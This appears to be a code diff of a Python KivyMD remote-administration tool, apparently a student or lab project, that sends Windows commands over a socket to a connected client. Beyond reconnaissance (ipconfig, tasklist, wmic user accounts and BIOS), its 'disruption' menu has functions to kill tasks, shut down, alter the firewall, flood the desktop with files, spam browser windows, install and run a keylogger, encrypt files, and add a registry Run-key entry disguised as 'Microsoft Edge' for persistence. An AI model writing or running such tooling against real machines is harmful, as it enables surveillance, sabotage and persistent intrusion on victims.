@@ -3,6 +3,7 @@ import socket
 import threading
 import sys
 import time
+
 import kivy
 import kivymd
 from kivymd.app import MDApp
@@ -24,6 +25,7 @@ ScreenManager:
             opacity: 1
             disabled: False
             on_release: app.StartServer()
+            
         MDLabel:
             id: statusLbl
             text: "Status"
@@ -32,6 +34,7 @@ ScreenManager:
             size_hint_y: None
             height: self.texture_size[1]
             pos_hint: {"center_x": .5, "center_y": .8}
+            
     MDScreen:
         name: "mainMenu"            
         ScrollView:
@@ -40,57 +43,70 @@ ScreenManager:
                     id: networkInfoBtn
                     text: "Network Info"
                     on_release: app.NetworkInfo()
+                    
                 OneLineListItem:
                     id: osInfoBtn
                     text: "OS Info"
                     on_release: app.OSInfo()
+                    
                 OneLineListItem:
                     id: gpuInfoBtn
                     text: "GPU Info"
                     on_release: app.GpuInfo()
+                    
                 OneLineListItem:
                     id: cpuBtn
                     text: "CPU Usage"
                     on_release: app.CpuUsage()
+                    
                 OneLineListItem:
                     id: taskBtn
                     text: "Task List"
                     on_release: app.Tasks()
+                    
                 OneLineListItem:
                     id: netserviceBtn
                     text: "Network Services"
                     on_release: app.Services()
+                    
                 OneLineListItem:
                     id: secPolicy
                     text: "Security Policy"
                     on_release: app.SecPolicy()
+                    
                 OneLineListItem:
                     id: memInfo
                     text: "Memory Information"
                     on_release: app.MemInfo()
+                    
                 OneLineListItem:
                     id: userInfoBtn
                     text: "Current User Information"
                     on_release: app.UserInfo()
+                    
                 OneLineListItem:
                     id: accountsBtn
                     text: "Accounts Information"
                     on_release: app.AccountInfo()
+                    
                 OneLineListItem:
                     id: biosBtn
                     text: "BIOS Information"
                     on_release: app.BIOSInfo()
+                    
         MDTextField:
             id: consoleField
             max_height: '200dp'
             hint_text: 'Console'
             multiline: True
+            
         MDIconButton:
             icon: "spider-thread"
             md_bg_color: 'red'
             pos_hint: {"center_x": .95, "center_y": .1} 
             elevation_normal: 12
             on_release: app.DisruptionMenu()
+            
     MDScreen:
         name: "disruptionMenu"
         ScrollView:
@@ -99,53 +115,65 @@ ScreenManager:
                     id: killTaskBtn
                     text: "Kill Task"
                     on_release: app.KillTask()
+                    
                 OneLineListItem:
                     id: shutDownBtn
                     text: "Shutdown"
                     on_release: app.Shutdown()
+                    
                 OneLineListItem:
                     id: fileCreateBtn
                     text: "File Creation Disruption"
                     on_release: app.FileCreate()
+                    
                 OneLineListItem:
                     id: firewallBtn
                     text: "Firewall"
                     on_release: app.Firewall()
+                    
                 OneLineListItem:
                     id: denyFileBtn
                     text: "Deny Files"
                     on_release: app.DenyFiles()
+                    
                 OneLineListItem:
                     id: openBrowser
                     text: "Open Browsers"
                     on_release: app.OpenBrowsers()
+                    
                 OneLineListItem:
                     id: instkeyloggerBtn
                     text: "Install Key Logger"
                     on_release: app.KeyloggerInstall()
+                    
                 OneLineListItem:
                     id: keyloggerBtn
                     text: "Key Logger Start"
                     on_release: app.KeyloggerInit()
+                    
                 OneLineListItem:
                     id: keyloggerstopBtn
                     text: "Key Logger Stop"
                     on_release: app.KeyloggerStop()
+                    
                 OneLineListItem:
                     id: encryptfilesBtn
                     text: "Encrypt Files"
                     on_release: app.EncryptFiles()
+                    
         MDTextField:
             id: disruptConsoleField
             max_height: '200dp'
             hint_text: 'Console'
             multiline: True
+            
         MDIconButton:
             icon: "menu"
             md_bg_color: 'lightblue'
             pos_hint: {"center_x": .95, "center_y": .1} 
             elevation_normal: 12
             on_press: app.MainMenu()
+            
 <TaskKillContent>
     orientation: 'vertical'
     spacing: '12dp'
@@ -163,10 +191,10 @@ ScreenManager:
         id: denyFilesID
         hint_text: 'Enter File Path'
 '''
-# Server IP and Port
-HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
-PORT = 21420
 
+# Server IP and Port
+HOST = '127.0.0.1'
+PORT = 21420
 
 class Main(MDApp):
     def build(self):
@@ -207,14 +235,13 @@ class Main(MDApp):
             # Reset console
             self.root.ids.consoleField.text = ''
 
-            # Send command to the client
+            # Get IPconfig Information
             command = 'ipconfig /all'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-
-            # Receive the output given from the client
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
+            
             print('Output: ', output)
             self.root.ids.consoleField.text = output
             break
@@ -254,6 +281,7 @@ class Main(MDApp):
             self.root.ids.consoleField.text = output + output2 + output3
             break
 
+    #Gather information about the graphics card
     def GpuInfo(self):
         while True:
             # Reset console
@@ -263,7 +291,7 @@ class Main(MDApp):
             command = 'wmic path win32_VideoController get name,Description,DriverVersion'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
+            recvsize = self.currConn.recv(1024).decode()       
             output = self.currConn.recv(int(recvsize)).decode()
 
             # Print results
@@ -280,10 +308,10 @@ class Main(MDApp):
             # Reset console
             self.root.ids.consoleField.text = ''
 
+            #Get CPU Load Percentage
             command = 'wmic cpu get loadpercentage'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
 
@@ -297,14 +325,12 @@ class Main(MDApp):
             # Reset console
             self.root.ids.consoleField.text = ''
 
-            # Send command to client
+            #Get List of Task
             command = 'tasklist'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-
-            # Receive output from client
             recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()  # Still needs more buffer
+            output = self.currConn.recv(int(recvsize)).decode()
 
             print('Output: ', output)
             self.root.ids.consoleField.text = output
@@ -316,10 +342,10 @@ class Main(MDApp):
             # Reset console
             self.root.ids.consoleField.text = ''
 
+            #Get list of services
             command = 'net start'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
 
@@ -333,10 +359,10 @@ class Main(MDApp):
             # Reset console
             self.root.ids.consoleField.text = ''
 
+            #Get list of security policy
             command = 'net accounts'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
 
@@ -380,6 +406,7 @@ class Main(MDApp):
             break
 
     # Fang's stuffz
+    #Get user info of the system
     def UserInfo(self):
         while True:
             # Reset console
@@ -408,6 +435,7 @@ class Main(MDApp):
             self.root.ids.consoleField.text = str(output+a2)
             break
 
+    #Get User Account Info
     def AccountInfo(self):
         while True:
             # Reset console
@@ -416,7 +444,6 @@ class Main(MDApp):
             command = 'wmic useraccount get domain,name,sid,status,passwordchangeable,passwordexpires,passwordrequired,localaccount'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
 
@@ -424,6 +451,7 @@ class Main(MDApp):
             self.root.ids.consoleField.text = output
             break
 
+    #Get BIOS information of Motherboard
     def BIOSInfo(self):
         while True:
             # Reset console
@@ -432,7 +460,6 @@ class Main(MDApp):
             command = 'wmic bios get manufacturer,name,primarybios,serialnumber,version,smbiospresent,status'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
 
@@ -453,6 +480,8 @@ class Main(MDApp):
             print('[+] Command sent')
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
+
+            #Print Results
             print(f"Output: {output}")
             self.root.ids.disruptConsoleField.text = output
             break
@@ -488,6 +517,8 @@ class Main(MDApp):
             print('Command sent to client: ', command)
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
+
+            #Print Results
             print('Output: ', output)
             self.root.ids.disruptConsoleField.text = output
             self.denyFilesDialog.dismiss(force=True)
@@ -500,11 +531,14 @@ class Main(MDApp):
             # Reset console
             self.root.ids.disruptConsoleField.text = ''
 
-            command = 'FOR /L %A IN (1 1 20) DO (start msedge)'
+            #Change to () for infinite loop
+            command = 'FOR /L %A IN (1 1 10) DO (start msedge)'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
+
+            #Print Results
             print('Output: ', output)
             self.root.ids.disruptConsoleField.text = output
             break
@@ -515,12 +549,15 @@ class Main(MDApp):
         while True:
             # Reset console
             self.root.ids.disruptConsoleField.text = ''
+            
             # Replace 20 with a larger number for actual attack
-            command = 'FOR /L %A IN (1 1 20) DO (echo. > C:\\Users\\%USERNAME%\\Desktop\\You_suck_eggs_%A.txt)'
+            command = 'FOR /L %A IN (1 1 20) DO (echo. > C:\\Users\\%USERNAME%\\Desktop\\You_got_hacked_by_eggs_%A.txt)'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
+
+            #Print Results
             print('Output: ', output)
             self.root.ids.disruptConsoleField.text = output
             break
@@ -538,6 +575,8 @@ class Main(MDApp):
             print('Command sent to client: ', command)
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
+
+            #Print Results
             print('Output: ', output)
             self.root.ids.disruptConsoleField.text = output
             break
@@ -573,6 +612,8 @@ class Main(MDApp):
             print('Command sent to client: ', command)
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
+
+            #Print Results
             print('Output: ', output)
             self.root.ids.disruptConsoleField.text = output
             self.killTaskDialog.dismiss(force=True)
@@ -621,8 +662,8 @@ class Main(MDApp):
                 print(dlcomplete)
                 self.root.ids.disruptConsoleField.text += dlcomplete
                 time.sleep(0.05)
+                
                 # Add payload to registry to run on login
-
                 command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Microsoft Edge" /t REG_SZ /d "{tpath}" /f'
                 self.currConn.send(command.encode())
                 comsent2 = str('\nCommand sent to client: '+ command)
@@ -758,21 +799,20 @@ class Main(MDApp):
                 self.root.ids.disruptConsoleField.text += o2
             break
 
+    #UI Dependencies for changing menus
     def DisruptionMenu(self):
         self.root.current = "disruptionMenu"
 
     def MainMenu(self):
         self.root.current = "mainMenu"
 
-
+#UI Dependencies for Dialog Box
 class DenyFilesContent(BoxLayout):
     pass
-
 
 class TaskKillContent(BoxLayout):
     pass
 
-
 if __name__ == '__main__':
     Main().run()
-  
+    
